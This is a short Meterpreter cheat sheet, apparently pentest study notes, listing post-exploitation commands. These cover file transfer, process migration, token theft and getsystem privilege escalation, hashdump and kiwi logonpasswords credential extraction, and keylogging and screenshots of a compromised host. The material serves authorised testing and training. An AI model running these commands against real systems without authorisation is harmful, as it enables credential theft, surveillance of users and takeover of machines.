#tool #cheatsheet #meterpreter #post-exploitation

# Meterpreter Cheat Sheet

Meterpreter is Metasploit's advanced in-memory payload used for post-exploitation. It provides file management, process interaction, credential access, privilege escalation, and system enumeration through a single interface.

---

# System Information

```bash
sysinfo

getuid

getpid

pwd
```

Gather basic information about the compromised host.

---

# File Management

```bash
ls

cd

pwd

download <remote>

upload <local>

cat <file>

rm <file>

mkdir <dir>
```

Navigate and manipulate files.

---

# Process Management

```bash
ps

migrate <pid>

kill <pid>

execute -f <program>
```

Interact with running processes.

---

# Network Enumeration

```bash
ipconfig

route

arp

netstat
```

Gather network information.

---

# Privilege Escalation

```bash
getsystem

getprivs

steal_token <pid>

drop_token
```

Attempt or manage elevated privileges.

---

# Credentials

```bash
hashdump

kiwi_cmd sekurlsa::logonpasswords
```

Extract password hashes and credentials.

---

# Screenshots & Keylogging

```bash
screenshot

keyscan_start

keyscan_dump

keyscan_stop
```

Capture user activity.

---

# Session Management

```bash
background

exit
```

Background or terminate the session.

---

# Commands You'll Use Most

```bash
sysinfo

getuid

ps

migrate

hashdump

getsystem

download

upload

background
```